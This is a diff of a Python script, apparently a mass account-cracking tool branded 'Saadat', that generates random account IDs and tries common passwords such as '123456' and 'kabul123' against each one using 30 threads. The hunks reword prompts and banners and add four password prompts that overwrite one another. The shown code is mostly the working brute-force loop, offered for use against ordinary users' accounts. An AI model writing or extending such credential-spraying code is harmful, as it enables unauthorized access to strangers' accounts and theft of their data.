@@ -408,10 +408,10 @@ class Main:
 		print("\033[1;37m     FIRST OF ALL SUBSCRIBE MY CHANNEL")
 		print("\033[1;33m     ••••••••••••••••••••••••••••••••••••••••••••••")
 		
-		print(" \033[1;39m━▷\033[1;32m [1] SUBSCRIBE THE CHANNEL FOR APPROVED")
-		print(" \033[1;39m━▷\033[1;31m [2] Exit")
+		print(" \033[1;39m\033[1;32m [1] SUBSCRIBE THE CHANNEL FOR APPROVED")
+		print(" \033[1;39m\033[1;31m [2] Exit")
 		print("")
-		baloch = input("\n\033[1;37m  \033[1;35mChoice \033[1;37m━━> \033[1;32m")
+		baloch = input("\n\033[1;37m  \033[1;35mChoice \033[1;37m\033[1;32m")
 		if baloch in ["", " "]:
 			exit()
 		elif baloch in ["2", "02"]:
@@ -424,7 +424,7 @@ class Main:
 			time.sleep(2.0)
 			print("\033[1;37m    Type Your Channel Name")
 			print("")
-			input("\n\033[1;32m  Type Name \033[1;34m━━>  \033[1;33m")
+			input("\n\033[1;32m  Type Name \033[1;34mSaadat\033[1;33m")
 			time.sleep(2.1)
 			print("")
 			print("\033[1;37m Successful ")
@@ -465,7 +465,7 @@ class Main:
 		xx = 999999999
 		idx = "100000" 
 		os.system("xdg-open https://www.youtube.com/@Saadat.Technical");print(logo)
-		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50000: "))
+		limit = int(input(" \n\033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 1000-2000-3000-1000-50,000... "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -474,16 +474,19 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				print("\n\033[1;32m [1] Ex(123456-786786-123456789-12345...) FOR Old IDZ\033[1;37m ")
+				print("\n\033[1;32m [2] Ex(afghan-khan123-kabul123-100200...) FOR AFG Mix IDZ\033[1;37m ")
+				listpass = input("%s [1] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [3] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [4] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6-10 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   FREE MODE ACTIVATE")
 				print("\n\033[1;32m [+] CRACK HAS BEEN STARTED")
-				print(" \033[1;37m[+] Note: Ok Open 70% JUST NOW")
 				print(" [!] IF NO RESULT USE AIRPLANE MODE ON & OFF 5 SECONDS")
 				print("\033[0;95m••••••••••••••••••••••••••••••••••••••••••••••")
 				print("\n")
@@ -896,7 +899,7 @@ class Main:
 		xx = 9999999999
 		idx = "10000" 
 		os.system('clear');print(logo)
-		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 50,000: "))
+		limit = int(input("\n \033[0;95m[+]\033[0;93m TOTAL IDS TO CRACK LIMIT 1000-2000-3000-1000-50,000... "))
 		try:
 			for n in range(limit):
 				_ = random.randint(x,xx)
@@ -905,23 +908,26 @@ class Main:
 			
 			print("\033[0;93m [+] TOTAL ID -> \033[0;91m%s\033[0;97m"%(len(self.id))) 
 			with ThreadPoolExecutor(max_workers=30) as coeg:
-				print("\n\033[1;32m [!] Ex(123456) FOR Old IDZ\033[1;37m ")
-				listpass = input("%s [?] ENTER PASSWORD :%s "%(G,Y))
+				print("\n\033[1;32m [1] Ex(123456-786786-123456789-12345...) FOR Old IDZ\033[1;37m ")
+				print("\n\033[1;32m [2] Ex(afghan-khan123-kabul123-100200...) FOR AFG Mix IDZ\033[1;37m ")
+				listpass = input("%s [1] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [2] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [3] ENTER PASSWORD :%s "%(G,Y))
+				listpass = input("%s [4] ENTER PASSWORD :%s "%(G,Y))
 				if len(listpass)<=5:
-					exit("\n%s [!] PASSWORD MINIMUM 6 CHARACTERS"%(B))
+					exit("\n%s [!] PASSWORD MINIMUM 6-10 CHARACTERS"%(B))
 				print("%s [*] CRACK WITH PASSWORD -> [\033[0;91m%s\033[0;93m]"%(G,listpass))
 				os.system("clear")
 				print(logo)
 				print("     \033[0;93m   FREE MODE ACTIVATE")
 				print("\n\033[0;94m [+] BRUTE HAS BEEN START")
-				print(" \033[0;96m[+] Note: Ok Open 70% just now")
 				print(" [!] IF NO RESULT USE AIRPLANE MODE 5 SECONDS")
 				print("\033[0;94m••••••••••••••••••••••••••••••••••••••••••••••")
 				print("\n")
 				print("\033[0;97m")
 				for user in self.id:
 					coeg.submit(self.api, user, listpass.split(","))
-			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using SAADAT tool...")
+			exit("\n\n \033[0;95m>>[PROCESS COMPLETE... \n\033[0;92m >>[Thanks for using Saadat tool...")
 		except Exception as e:exit(str(e))
  
 	def api(self, uid, pwx):
